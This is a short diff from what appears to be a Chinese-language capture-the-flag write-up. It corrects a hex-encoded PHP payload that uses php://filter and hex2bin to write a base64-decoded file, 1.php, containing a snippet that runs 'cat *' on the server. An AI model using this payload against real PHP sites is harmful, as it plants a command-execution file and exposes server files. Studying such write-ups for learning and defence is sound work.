@@ -91,6 +91,6 @@ $b=base64_encode($a);//$a=PD89YGNhdCAqYDs=
 $c=bin2hex('PD89YGNhdCAqYDs');
 得到5044383959474e6864434171594473
 
-?v2=115044383959474e68644341715944&v3=php://filter/write=convert.base64-decode/resource=1.php
+?v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-decode/resource=1.php
 POST:v1=hex2bin
 ```
